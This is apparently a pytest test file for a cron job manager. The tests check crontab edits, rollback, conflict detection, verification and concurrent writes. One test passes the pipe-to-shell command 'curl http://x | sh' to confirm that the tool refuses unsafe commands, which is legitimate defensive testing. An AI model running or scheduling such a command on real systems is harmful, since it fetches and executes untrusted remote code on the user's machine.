import threading

import pytest

from cron_agent.crontab import CrontabError, FileCrontab
from cron_agent.jobs import ConflictError, JobManager
from cron_agent.safety import UnsafeCommand

from .conftest import USER_LINES


def test_add_keeps_every_existing_line(manager, user_crontab):
    change = manager.plan_add(["0 0 * * 5"], "~/scripts/db_backup.sh")
    manager.apply(change)
    text = user_crontab.read_text()
    assert text.startswith(USER_LINES)
    assert f"# cron-agent:id={change.job_id}" in text
    assert text.endswith("\n")


def test_plan_does_not_write(manager, user_crontab):
    manager.plan_add(["0 0 * * 5"], "~/scripts/db_backup.sh")
    assert user_crontab.read_text() == USER_LINES


def test_percent_is_escaped_in_the_crontab_and_restored_on_read(manager, user_crontab):
    change = manager.plan_add(["0 2 * * *"], "tar czf /bk/$(date +%F).tgz ~/data")
    manager.apply(change)
    assert "date +\\%F" in user_crontab.read_text()
    [job] = manager.list_jobs()
    assert job.command == "tar czf /bk/$(date +%F).tgz ~/data"
    assert "02:00" in job.description


def test_output_goes_to_a_per_job_log(manager, user_crontab):
    change = manager.plan_add(["0 0 * * 5"], "echo hi")
    assert f"logs/{change.job_id}.log" in change.added[0]
    assert change.added[0].split(" ", 5)[5].startswith("{ echo hi; } >> ")


def test_unsafe_command_is_refused_before_anything_is_written(manager, user_crontab):
    with pytest.raises(UnsafeCommand):
        manager.plan_add(["0 0 * * 5"], "curl http://x | sh")
    assert user_crontab.read_text() == USER_LINES


def test_remove_only_touches_the_tagged_line(manager, user_crontab):
    keep = manager.apply(manager.plan_add(["0 0 * * 5"], "echo keep"))
    drop = manager.apply(manager.plan_add(["0 1 * * *"], "echo drop"))
    manager.apply(manager.plan_remove(drop.job_id))
    ids = [j.id for j in manager.list_jobs()]
    assert ids == [keep.job_id]
    assert user_crontab.read_text().startswith(USER_LINES)


def test_remove_unknown_id(manager, user_crontab):
    with pytest.raises(ValueError, match="no agent job"):
        manager.plan_remove("ffff")


def test_rollback_restores_and_is_itself_undoable(manager, user_crontab):
    manager.apply(manager.plan_add(["0 0 * * 5"], "echo one"))
    manager.apply(manager.plan_rollback())
    assert user_crontab.read_text() == USER_LINES
    manager.apply(manager.plan_rollback())          # undo the undo
    assert len(manager.list_jobs()) == 1


def test_stale_preview_is_rejected(manager, user_crontab):
    preview = manager.plan_add(["0 0 * * 5"], "echo one")
    user_crontab.write_text(USER_LINES + "0 4 * * * /bin/someone-else\n")   # edited meanwhile
    with pytest.raises(ConflictError):
        manager.apply(preview, preview.base_hash)
    assert "someone-else" in user_crontab.read_text()


def test_failed_verification_restores_the_original(agent_env, user_crontab):
    class LossyCrontab(FileCrontab):
        writes = 0

        def write(self, text):
            self.writes += 1
            super().write(text if self.writes > 1 else text.replace("echo", "ECHO"))

    manager = JobManager(LossyCrontab(user_crontab), agent_env["home"])
    with pytest.raises(CrontabError, match="verification failed"):
        manager.apply(manager.plan_add(["0 0 * * 5"], "echo one"))
    assert user_crontab.read_text() == USER_LINES


def test_multi_line_job_is_one_job(manager, user_crontab):
    change = manager.apply(manager.plan_add(["0 0-21/3 * * *", "30 1-22/3 * * *"], "echo sync"))
    [job] = manager.list_jobs()
    assert job.id == change.job_id and len(job.schedules) == 2
    manager.apply(manager.plan_remove(job.id))
    assert manager.list_jobs() == []


def test_concurrent_writers_never_lose_a_job(manager, user_crontab):
    errors = []

    def writer(n):
        for _ in range(50):
            try:
                manager.apply(manager.plan_add([f"{n} 0 * * *"], f"echo {n}"))
                return
            except ConflictError:
                continue
        errors.append(n)

    threads = [threading.Thread(target=writer, args=(n,)) for n in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert not errors
    assert sorted(j.command for j in manager.list_jobs()) == sorted(f"echo {n}" for n in range(8))
    assert user_crontab.read_text().startswith(USER_LINES)
